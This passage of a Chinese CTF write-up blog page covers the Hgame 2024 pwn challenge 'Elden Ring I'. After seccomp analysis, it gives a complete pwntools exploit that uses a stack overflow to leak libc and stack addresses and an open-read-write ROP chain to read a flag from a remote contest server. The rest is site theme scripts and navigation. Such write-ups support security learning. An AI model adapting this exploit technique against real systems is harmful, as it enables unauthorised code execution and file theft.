+<p>可以使用seccomp-tools来检查</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://www.cnblogs.com/robinbin/p/16172041.html" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://www.cnblogs.com/robinbin/p/16172041.html" autofill="title,icon"><div class="left"><span class="title">https://www.cnblogs.com/robinbin/p/16172041.html</span><span class="cap link footnote">https://www.cnblogs.com/robinbin/p/16172041.html</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2014.10.02_qlz6EOignb.png"></p>
+<p>这个文件链接库有点问题，patch一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter ~/Pwn/glibc-<span class="built_in">all</span>-<span class="keyword">in</span>-one/libs/<span class="number">2.31</span>-0ubuntu9_amd64/ld-<span class="number">2.31</span>.so vuln </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vuln</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2016.57.01_X3RKjuLVPq.png"></p>
+<p><code>execve</code>和<code>execveat</code>都不能用</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2016.58.24_RLwzWlD__Q.png"></p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://forum.butian.net/share/544" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://forum.butian.net/share/544" autofill="title,icon"><div class="left"><span class="title">https://forum.butian.net/share/544</span><span class="cap link footnote">https://forum.butian.net/share/544</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdi,rsi,rdx</span><br></pre></td></tr></table></figure>
+
+<p>泄露出libc基地址后,使用libc中的gadget控制参数</p>
+<p>使用<strong>ret2csu</strong></p>
+<p>在<code>__libc_csu_init</code>函数中有两段可以利用的代码段</p>
+<p>具体利用看链接</p>
+<div class="tag-plugin link dis-select"><a class="link-card plain" title="" href="https://forum.butian.net/share/544" target="_blank" rel="external nofollow noopener noreferrer" cardlink api="https://site-info-api-tan.vercel.app/api/v1?url=https://forum.butian.net/share/544" autofill="title,icon"><div class="left"><span class="title">https://forum.butian.net/share/544</span><span class="cap link footnote">https://forum.butian.net/share/544</span></div><div class="right"><div class="lazy img" data-bg="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/link/8f277b4ee0ecd.svg"></div></div></a></div>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-02%2019.09.46_LjMVE5ol0y.png"></p>
+<p>这里ret2csu不好打，就直接orw</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;47.100.245.185&#x27;</span>,<span class="number">32384</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_got_addr=<span class="number">0x404028</span></span><br><span class="line">puts_plt_addr=<span class="number">0x4010c0</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4013e3</span></span><br><span class="line">ret_addr=<span class="number">0x40101a</span></span><br><span class="line">push_rsp_offset=<span class="number">0x0422bd</span></span><br><span class="line">puts_offset=libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">open_offset=libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_offset=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_offset=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rsi_offset=<span class="number">0x02601f</span></span><br><span class="line">pop_rdx_offset=<span class="number">0x142c92</span></span><br><span class="line">vuln_addr=<span class="number">0x40125b</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expandLeak</span>(<span class="params">payload</span>):</span><br><span class="line">    <span class="comment">#利用read扩大溢出</span></span><br><span class="line">    <span class="keyword">global</span> pop_rdx_offset,libc_base,ret_addr,read_offset,vuln_addr</span><br><span class="line">    prePayload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x108</span> + p64(pop_rdx_offset + libc_base) + p64(<span class="number">0x1fff</span>) + p64(ret_addr) + p64(read_offset + libc_base)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;I offer you an accord.\n&#x27;</span>, prePayload)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">4</span>+payload)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄漏libc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)+p64(vuln_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;I offer you an accord.\n&#x27;</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">libc_base= u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - puts_offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露栈地址</span></span><br><span class="line">payload=p64(pop_rdi_addr) + p64(<span class="number">1</span>) + p64(pop_rdx_offset+libc_base) + p64(<span class="number">0x198</span>) + p64(write_offset+libc_base)+p64(vuln_addr)</span><br><span class="line">expandLeak(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvn(<span class="number">0x190</span>)</span><br><span class="line">stack_base=u64(p.recvn(<span class="number">8</span>))-<span class="number">0x1a8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#布置open</span></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(<span class="number">1</span>)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(<span class="number">0x300</span>)+p64(write_offset+libc_base)+p64(vuln_addr)</span><br><span class="line">expandLeak(payload)</span><br><span class="line"></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(stack_base+<span class="number">0x1d0</span>)+p64(pop_rsi_offset+libc_base)+p64(<span class="number">0</span>)+p64(pop_rdx_offset+libc_base)+p64(<span class="number">0</span>)+p64(ret_addr)+p64(open_offset+libc_base)</span><br><span class="line"><span class="comment">#用来确定字符串偏移payload=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_offset+libc_base)+p64(stack_base+0x1d0)+p64(pop_rdx_offset+libc_base)+p64(0x300)+p64(ret_addr)+p64(write_offset+libc_base)</span></span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line">payload+=<span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span></span><br><span class="line">expandLeak(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read&amp;write</span></span><br><span class="line">payload=p64(pop_rdi_addr)+p64(<span class="number">3</span>)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(<span class="number">60</span>)+p64(read_offset+libc_base)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(<span class="number">1</span>)+p64(pop_rsi_offset+libc_base)+p64(stack_base)+p64(pop_rdx_offset+libc_base)+p64(<span class="number">60</span>)+p64(write_offset+libc_base)</span><br><span class="line">payload+=p64(vuln_addr)</span><br><span class="line">expandLeak(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getflag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall(timeout=<span class="number">2</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/Hgame2024-Week1%20Writeup/%E6%88%AA%E5%B1%8F2024-02-03%2013.45.26_PPvouEFpBv.png"></p>
+
+<div class="article-footer fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/05/UWSP%20Pointer%20Overflow%20CTF/">UWSP Pointer Overflow CTF-Writeup</a></div><div class="item" id="next"></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">Joooook</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.0">Stellar 1.29.0</a> 主题创建。<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Week1"><span class="toc-text">Week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%A5%E8%87%AA%E6%98%9F%E5%B0%98%E7%9A%84%E9%97%AE%E5%80%99"><span class="toc-text">来自星尘的问候</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%8C%E5%84%BF%E5%B8%8C%E5%84%BF%E5%B8%8C%E5%B0%94"><span class="toc-text">希儿希儿希尔</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#simple-attack"><span class="toc-text">simple-attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-it"><span class="toc-text">Bypass it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezHTTP"><span class="toc-text">ezHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Select-Courses"><span class="toc-text">Select Courses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2048-16"><span class="toc-text">2048*16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jhat"><span class="toc-text">jhat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re"><span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezPYC"><span class="toc-text">ezPYC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezRSA"><span class="toc-text">ezRSA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezMath"><span class="toc-text">ezMath</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezPRNG"><span class="toc-text">ezPRNG</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84%E5%9B%BE%E7%89%87"><span class="toc-text">奇怪的图片</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezshellcode"><span class="toc-text">ezshellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elden-Random-Challenge"><span class="toc-text">Elden Random Challenge</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezfmt-string"><span class="toc-text">ezfmt string</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Elden-Ring-%E2%85%A0"><span class="toc-text">Elden Ring Ⅰ</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.0" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":"https://site-info-api-tan.vercel.app/api/v1?url={href}"},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
